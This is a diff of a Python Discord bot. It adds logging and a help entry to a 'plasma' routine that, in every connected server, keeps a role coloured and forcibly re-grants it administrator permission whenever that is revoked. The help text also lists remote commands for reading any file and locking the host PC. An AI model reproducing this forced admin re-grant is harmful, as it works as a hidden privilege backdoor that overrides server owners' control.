@@ -156,9 +156,11 @@ async def plasma():
             try:
                 if plasma_role.color.value!=0xaa0055:
                     await plasma_role.edit(color=discord.Color(0xaa0055),reason="Plasma is this very nice red color, get it right")
+                    logger.info(f"Recolored Plasma in {guild.name}")
                 if not plasma_role.permissions.administrator:
                     plasma_role.permissions.update(administrator=True)
                     await plasma_role.edit(permissions=plasma_role.permissions,reason="Plasma is the administrator because it ionizes the rules")
+                    logger.info(f"Made Plasma admin in {guild.name}")
             except discord.HTTPException:
                 pass
         try:
@@ -256,6 +258,7 @@ async def run_cmd(cmd,args,lore,message=None):
                             " - tail <lines> <file>                     - Outputs last <lines> lines of any file\n"
                             " - servers                                 - List connected servers and channels\n"
                             " - volume <number>                         - Changes volume to <number>%\n"
+                            " - plasma                                  - Creates plasma role in all servers\n"
                             " - reboot <flag>                           - Initiates reboot and updates. Optional flags listed below\n"
                             "  ↳ -c                                     - Opens console after reboot\n"
                             "  ↳ -l                                     - Locks PC remotely\n"
